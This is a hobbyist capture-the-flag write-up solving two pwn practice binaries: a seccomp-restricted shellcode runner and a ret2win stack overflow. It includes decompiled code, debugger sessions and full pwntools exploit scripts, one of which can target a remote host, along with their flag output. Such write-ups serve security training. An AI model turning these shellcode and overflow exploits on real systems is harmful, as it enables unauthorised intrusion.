## First wave contained 5 pwn challenges.. solved em.. here's how..

**1st one**:  [download](https://github.com/TheGreenOfficial/pwn-archive/blob/main/pwn-archive/binaries/vault.zip)

```Read-Readme
Target: Ubuntu 24.04, glibc 2.39 (2.39-0ubuntu8.9), x86-64.

Files:
  vault                 the challenge binary
  libc.so.6             the exact libc the target runs against
  ld-linux-x86-64.so.2  the matching dynamic loader

Run locally against the provided libc so offsets match the live target:
  patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./vault && ./vault
  # or, without patchelf:
  ./ld-linux-x86-64.so.2 --library-path . ./vault

The live target is reachable at the host:port shown for your instance.

do dis also : create flag.txt in current dir and put fah{congrutalion}

```

**patch elf**

```
skid@TheGreen:~/ctfs/new$  patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./vault
```

**First run of binary**

```
skid@TheGreen:~/ctfs/new$ ./vault
=== Vault ===
send your shellcode (up to 4096 bytes), then EOF:
yooooooo
Segmentation fault         ./vault
skid@TheGreen:~/ctfs/new$
```

**Ghidra decompiled view**

```
====================================================================================================
FUNCTION: lockdown
ADDRESS : 00401236
====================================================================================================
void lockdown(void)

{
  undefined8 uVar1;
  long in_FS_OFFSET;
  uint local_54;
  undefined4 local_48 [14];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  uVar1 = seccomp_init(0x80000000);
  local_48[0] = 0x101;
  local_48[1] = 2;
  local_48[2] = 0;
  local_48[3] = 1;
  local_48[4] = 3;
  local_48[5] = 8;
  local_48[6] = 5;
  local_48[7] = 0x106;
  local_48[8] = 9;
  local_48[9] = 0xb;
  local_48[10] = 0xc;
  local_48[0xb] = 0xf;
  local_48[0xc] = 0x3c;
  local_48[0xd] = 0xe7;
  for (local_54 = 0; local_54 < 0xe; local_54 = local_54 + 1) {
    seccomp_rule_add(uVar1,0x7fff0000,local_48[local_54],0);
  }
  seccomp_load(uVar1);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
====================================================================================================
FUNCTION: main
ADDRESS : 00401319
====================================================================================================
undefined8 main(void)

{
  code *__buf;
  undefined8 uVar1;
  ssize_t sVar2;
  
  setvbuf(stdout,(char *)0x0,2,0);
  __buf = mmap((void *)0x0,0x1000,7,0x22,-1,0);
  if (__buf == (code *)0xffffffffffffffff) {
    perror("mmap");
    uVar1 = 1;
  }
  else {
    puts("=== Vault ===");
    puts("send your shellcode (up to 4096 bytes), then EOF:");
    sVar2 = read(0,__buf,0x1000);
    if (sVar2 < 1) {
      uVar1 = 1;
    }
    else {
      lockdown();
      (*__buf)();
      uVar1 = 0;
    }
  }
  return uVar1;
}
```

**Simplifyed version with comments**

```
// lockdown(): installs seccomp filter so you can only use these syscalls
void lockdown(void) {
    // allowlist of syscall numbers:
    // 0x101 = openat? no wait let's decode:
    // 0x101 = openat? actually: 257 = openat, 2 = open, 0 = read,
    // 1 = write, 3 = close, 8 = lseek, 5 = fstat, 0x106 = newfstatat,
    // 9 = mmap, 0xb = munmap, 0xc = brk, 0xf = rt_sigreturn,
    // 0x3c = exit, 0xe7 = exit_group
    // So: basically file I/O syscalls only. No execve, no socket.
    void *ctx = seccomp_init(0x80000000); // SCMP_ACT_KILL_PROCESS default
    int allowed[] = {257,2,0,1,3,8,5,0x106,9,11,12,15,60,231};
    for (int i = 0; i < 14; i++)
        seccomp_rule_add(ctx, 0x7fff0000 /* SCMP_ACT_ALLOW */, allowed[i], 0);
    seccomp_load(ctx);
}

int main(void) {
    setvbuf(stdout, NULL, 2 /* _IONBF */, 0); // unbuffered stdout

    // mmap(NULL, 4096, PROT_READ|WRITE|EXEC (7), MAP_PRIVATE|MAP_ANON (0x22), -1, 0)
    void *buf = mmap(NULL, 0x1000, 7, 0x22, -1, 0);
    //                      ^^^ RWX!  <-- this is the trick

    if (buf == MAP_FAILED) { perror("mmap"); return 1; }

    puts("=== Vault ===");
    puts("send your shellcode (up to 4096 bytes), then EOF:");

    ssize_t n = read(0, buf, 0x1000); // read raw bytes from stdin
    if (n < 1) return 1;

    lockdown();  // install seccomp BEFORE running your code
    ((void(*)())buf)(); // <-- jump into your shellcode
    return 0;
}
```

**Exploit writing..**

```
from pwn import *

context.arch = "amd64"

sc = asm("""
    lea rdi, [rip+p]      # rdi = pointer to "flag.txt" (rip-relative)
    xor esi, esi          # esi = 0  (O_RDONLY)
    xor edx, edx          # edx = 0  (mode, unused for open)
    mov eax, 2            # syscall 2 = open
    syscall               # open("flag.txt", O_RDONLY) -> fd in eax

    mov edi, eax          # edi = fd
    sub rsp, 0x100        # carve 0x100 bytes on stack for the read buffer
    mov rsi, rsp          # rsi = buffer
    mov edx, 0x100        # edx = 0x100 bytes to read
    xor eax, eax          # syscall 0 = read
    syscall               # read(fd, buf, 0x100) -> n in eax

    mov edx, eax          # edx = n (bytes actually read)
    mov edi, 1            # edi = 1 (stdout)
    mov rsi, rsp          # rsi = buffer
    mov eax, 1            # syscall 1 = write
    syscall               # write(1, buf, n) -> prints flag

    mov eax, 60           # syscall 60 = exit
    xor edi, edi          # exit code 0
    syscall               # exit(0)

p:
    .asciz "flag.txt"     # string; RIP-relative label for lea
""")

io = process(["./ld-linux-x86-64.so.2",
              "--library-path",
              ".",
              "./vault"])

io.recvuntil(b"EOF:")
io.send(sc)
io.shutdown("send")

print(io.recvall().decode())
```

**exploit run**

```
skid@TheGreen:~/ctfs/new$ ls
e.py  flag.txt  ld-linux-x86-64.so.2  libc.so.6  README.txt  vault  vault.ghidra-out  vault.zip
skid@TheGreen:~/ctfs/new$ python3 e.py
[+] Starting local process './ld-linux-x86-64.so.2': pid 2882
[+] Receiving all data: Done (19B)
[*] Process './ld-linux-x86-64.so.2' stopped with exit code 0 (pid 2882)

fah{congrutalion}

skid@TheGreen:~/ctfs/new$
```

**Try it yourself binary is there its self explaned..**

---

**2nd one**:  [download](https://github.com/TheGreenOfficial/pwn-archive/blob/main/pwn-archive/binaries/checkpoint.zip)

**first look of binary**

```
skid@TheGreen:~/ctfs/new/pwn$ ./checkpoint
=== Sparrow Freight border checkpoint ===
State your name for the log:
asdfasdf
Access denied, asdfasdf
���Mu. Turn back.
skid@TheGreen:~/ctfs/new/pwn$ 
```

**Decompiled view in ghidra**

```
====================================================================================================
FUNCTION: grant_access
ADDRESS : 00401216
====================================================================================================
void grant_access(void)

{
  char local_68 [88];
  FILE *local_10;
  
  local_10 = fopen("/flag","r");
  if (local_10 == (FILE *)0x0) {
    puts("[!] flag file missing - tell an admin");
  }
  else {
    fgets(local_68,0x50,local_10);
    fclose(local_10);
    printf("ACCESS GRANTED: %s\n",local_68);
    fflush(stdout);
  }
  return;
}
====================================================================================================
FUNCTION: checkpoint
ADDRESS : 004012a4
====================================================================================================
void checkpoint(void)

{
  undefined1 local_48 [64];
  
  puts("=== Sparrow Freight border checkpoint ===");
  puts("State your name for the log:");
  read(0,local_48,256);
  printf("Access denied, %s. Turn back.\n",local_48);
  return;
}
====================================================================================================
FUNCTION: main
ADDRESS : 00401302
====================================================================================================
undefined8 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  checkpoint();
  return 0;
}
```

**alr checkpoint()'s read() has buf overflow and its ret2win we have to return to grant_access() function. Let's use pwn checksec**

```
skid@TheGreen:~/ctfs/new/pwn$ pwn checksec ./checkpoint
[*] '/home/skid/ctfs/new/pwn/checkpoint'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    '.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
skid@TheGreen:~/ctfs/new/pwn$
```

**No PIE gud.. let's find out  write exploit for this ret2win..**

```
skid@TheGreen:~/ctfs/new/pwn$ gdb ./checkpoint
GNU gdb (Debian 17.2-1+b1) 17.2
Copyright (C) 2025 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 200 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 12 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from ./checkpoint...
Use the errno (or errno <number>) command to see the name of the last or provided (libc) error
pwndbg> r < <(pwn cyclic 100)
Starting program: /home/skid/ctfs/new/pwn/checkpoint < <(pwn cyclic 100)
⚠️ warning: Expected absolute pathname for libpthread in the inferior, but got ./libc.so.6.
⚠️ warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
=== Sparrow Freight border checkpoint ===
State your name for the log:
Access denied, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa�. Turn back.

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401301 in checkpoint ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────
 RAX  0x82
 RBX  0x7fffffffdd38 —▸ 0x7fffffffe01b ◂— '/home/skid/ctfs/new/pwn/checkpoint'
 RCX  0
 RDX  0
 RDI  0x7fffffffd9e0 —▸ 0x7fffffffda10 ◂— 0x6420737365630a2e ('.\ncess d')
 RSI  0x7fffffffda10 ◂— 0x6420737365630a2e ('.\ncess d')
 R8   2
 R9   0
 R10  0xffffffff
 R11  0x202
 R12  1
 R13  0
 R14  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011e0 (__do_global_dtors_aux) ◂— endbr64
 R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x6161617261616171 ('qaaaraaa')
 RSP  0x7fffffffdc08 ◂— 0x6161617461616173 ('saaataaa')
 RIP  0x401301 (checkpoint+93) ◂— ret
───────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────
 ► 0x401301 <checkpoint+93>    ret                                <0x6161617461616173>
    ↓









────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdc08 ◂— 0x6161617461616173 ('saaataaa')
01:0008│     0x7fffffffdc10 ◂— 0x6161617661616175 ('uaaavaaa')
02:0010│     0x7fffffffdc18 ◂— 0x6161617861616177 ('waaaxaaa')
03:0018│     0x7fffffffdc20 ◂— 0x7fff61616179
04:0020│     0x7fffffffdc28 —▸ 0x7fffffffdd38 —▸ 0x7fffffffe01b ◂— '/home/skid/ctfs/new/pwn/checkpoint'
05:0028│     0x7fffffffdc30 ◂— 0x1003fe040
06:0030│     0x7fffffffdc38 —▸ 0x401302 (main) ◂— endbr64
07:0038│     0x7fffffffdc40 —▸ 0x7fffffffdd38 —▸ 0x7fffffffe01b ◂— '/home/skid/ctfs/new/pwn/checkpoint'
──────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0 0x401301           checkpoint+93
   1 0x6161617461616173
   2 0x6161617661616175
   3 0x6161617861616177
   4 0x7fff61616179
   5 0x7fffffffdd38
   6 0x1003fe040
   7 0x401302           main
─────────────────────────────────────────────────────────────────────────────────────────────────[ LAST SIGNAL ]──────────────────────────────────────────────────────────────────────────────────────────────────
Program received signal SIGSEGV (fault address: 0x0).
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> quit
skid@TheGreen:~/ctfs/new/pwn$ pwn cyclic -l qaaar
64
skid@TheGreen:~/ctfs/new/pwn$
```

```
#!/usr/bin/env python3
import sys
from pwn import *

if len(sys.argv) == 3:
    ip = sys.argv[1]
    port = int(sys.argv[2])
    print(f"[*] Connecting to remote target -> {ip}:{port}")
    p = remote(ip, port)
else:
    print("[*] Running local binary process...")
    p = process('./checkpoint')

p.recvuntil(b'log:')

payload = b'A' * 72
payload += p64(0x00401216)

p.sendline(payload)

p.interactive()
```

**Running exploit to get flag..**

```
skid@TheGreen:~/ctfs/new/pwn$ python3 e.py
[*] Running local binary process...
[+] Starting local process './checkpoint': pid 1792
[*] Switching to interactive mode

Access denied, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x16\x12@. Turn back.
ACCESS GRANTED: flag{congruletion}

[*] Got EOF while reading in interactive
$ exit
[*] Process './checkpoint' stopped with exit code -11 (SIGSEGV) (pid 1792)
[*] Got EOF while sending in interactive
skid@TheGreen:~/ctfs/new/pwn$
```

---

